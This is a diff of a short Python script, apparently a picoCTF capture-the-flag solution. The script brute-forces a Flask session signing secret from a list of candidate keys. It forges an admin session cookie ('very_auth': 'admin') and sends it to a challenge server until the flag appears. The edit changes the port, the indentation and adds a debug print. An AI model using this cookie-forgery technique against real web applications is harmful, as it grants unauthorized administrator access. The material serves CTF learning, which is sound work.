@@ -27,12 +27,13 @@ def encodeFlaskCookie(secret_key, cookieDict):
 	return signingSerializer.dumps(cookieDict)
 
 if __name__=='__main__':
-	for name in cookie_names:
-		session = {}
-		session["very_auth"] = "admin"
-		cookie = encodeFlaskCookie(name, session)
-		r = requests.get("http://wily-courier.picoctf.net:65121/", cookies={"session":cookie}, allow_redirects=False)
-		if "picoCTF" in r.text:
-			print(r.text)
-			break
+    for name in cookie_names:
+        print(name , "cookie_name")
+        session = {}
+        session["very_auth"] = "admin"
+        cookie = encodeFlaskCookie(name, session)
+        r = requests.get("http://wily-courier.picoctf.net:62997/", cookies={"session":cookie}, allow_redirects=False)
+        if "picoCTF" in r.text:
+            print(r.text)
+            break
 
